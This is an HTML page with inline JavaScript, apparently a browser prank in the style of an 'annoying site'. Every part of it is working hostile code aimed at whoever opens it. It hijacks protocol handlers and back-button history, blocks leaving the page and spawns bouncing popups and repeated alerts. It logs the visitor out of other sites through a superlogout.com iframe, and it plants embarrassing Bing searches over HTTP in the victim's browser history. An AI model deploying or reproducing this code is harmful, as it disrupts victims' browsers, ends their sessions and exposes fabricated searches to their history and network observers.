<!--
  Same as before, but move the searches to top level window
-->
<html>
<body>

<style>
  html, body { width: 100%; margin: 0; }
  video { width: 100%; height: 100%; }
  iframe { width: 100%; height: 50%; }
</style>

<script>
  const HTML = document.body.outerHTML
  const SCREEN_WIDTH = window.screen.availWidth
  const SCREEN_HEIGHT = window.screen.availHeight
  const WINDOW_WIDTH = 360
  const WINDOW_HEIGHT = 200
  const VELOCITY = 15
  const MARGIN = 20
  const TICK_LENGTH = 50

  // Do embarrassing searches over HTTP, so your ISP and spy agencies can see it
  const SEARCHES = [
    'where should i bury the body',
    'why does my eye twitch',
    'why is my poop green',
    'why do i feel so empty',
    'why do i always feel hungry',
    'why do i always have diarrhea',
    'why does my anus itch',
    'why does my belly button smell',
    'why does my cat attack me',
    'why does my dog eat poop',
    'why does my fart smell so bad',
    'why does my mom hate me',
    'why does my pee smell bad',
    'why does my poop float',
    'proof that the earth is flat'
  ]

  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })

  if (navigator.registerProtocolHandler) {
    const handlerUrl = window.location.href + '/url=%s'
    navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
    navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
    navigator.registerProtocolHandler('im', handlerUrl, 'haha')
    navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
    navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
    navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
    navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
    navigator.registerProtocolHandler('news', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
    navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
    navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
    navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
    navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
    navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
    navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
    navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
    navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
    navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
  }

  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
  window.addEventListener('popstate', () => {
    window.history.forward()
  })

  if (window.opener) {
    // *** RUNS IN CHILD WINDOW: ***

    const exitFullscreen = document.exitFullscreen ||
      document.webkitExitFullscreen ||
      document.mozCancelFullScreen ||
      document.msExitFullscreen

    exitFullscreen.call(document)

    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
    let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

    window.setInterval(() => {
      const x = window.screenX
      const y = window.screenY
      const width = window.outerWidth
      const height = window.outerHeight

      if (x < MARGIN) vx = Math.abs(vx)
      if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
      if (y < MARGIN) vy = Math.abs(vy)
      if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

      window.moveBy(vx, vy)
    }, TICK_LENGTH)

    const VIDEOS = ['nyan.mp4', 'cat.mp4', 'trolol.mp4']
    const video = document.createElement('video')
    video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)]
    video.autoplay = true

    document.body.appendChild(video)

    window.onunload = () => {
      if (!window.opener.closed) window.opener.onCloseWindow(window)
    }
  }

  if (!window.opener) {
    // *** RUNS IN PARENT WINDOW: ***

    const logoutIframe = document.createElement('iframe')
    logoutIframe.src = 'http://superlogout.com'
    document.body.appendChild(logoutIframe)

    setInterval(() => window.alert(Array(100).join('ARE YOU ANNOYED YET? ')), 15000)
  }

  // *** RUNS IN PARENT AND CHILD WINDOWS: ***

  let wins = []

  document.addEventListener('click', openWindow)

  function openWindow () {
    focusWindows()

    const { x, y } = getRandomCoords()
    const win = window.open('', '', `width=${WINDOW_WIDTH},height=${WINDOW_HEIGHT},left=${x},top=${y}`)

    // The second child window that opens will be the Bing search window
    if (wins.length === 1) {
      setupSearchWindow(win)
    } else {
      win.document.write(`<html>${HTML}</html>`)
    }

    wins.push(win)
  }

  // Pull this out into a reusable function
  function getRandomCoords () {
    const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WINDOW_WIDTH - MARGIN))
    const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WINDOW_HEIGHT - MARGIN))
    return { x, y }
  }

  // Moving the Bing searches from an iframe to a top-level window ensures that the
  // searches will show up in the browser history as a visited page.
  function setupSearchWindow (win) {
    // Notice that this window cannot navigate itself since it's on an other origin
    // and we can't run JS inside the window.
    win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
    let searchIndex = 1
    let interval = setInterval(() => {

      // Once all searches are done, convert this to a normal child window that moves
      // around.
      if (searchIndex >= SEARCHES.length) {
        clearInterval(interval)
        win.window.location = 'about:blank'
        setTimeout(() => {
          win.document.write(`<html>${HTML}</html>`)
        }, 100)
        return
      }

      // Detect that cross-origin window has closed by polling the 'closed' property
      if (win.closed) {
        clearInterval(interval)
        onCloseWindow(win)
        return
      }

      // To move the window around, it must be on the same origin. So, temporarily
      // change it to 'about:blank' and move before doing next search.
      win.window.location = 'about:blank'
      setTimeout(() => {
        const { x, y } = getRandomCoords()
        win.moveTo(x, y)
        win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
        searchIndex += 1
      }, 100)
    }, 2000)
  }

  function focusWindows () {
    wins.forEach(win => win.focus())
  }

  function onCloseWindow (win) {
    const i = wins.indexOf(win)
    if (i >= 0) wins.splice(i, 1)
  }

</script>

</body>
</html>
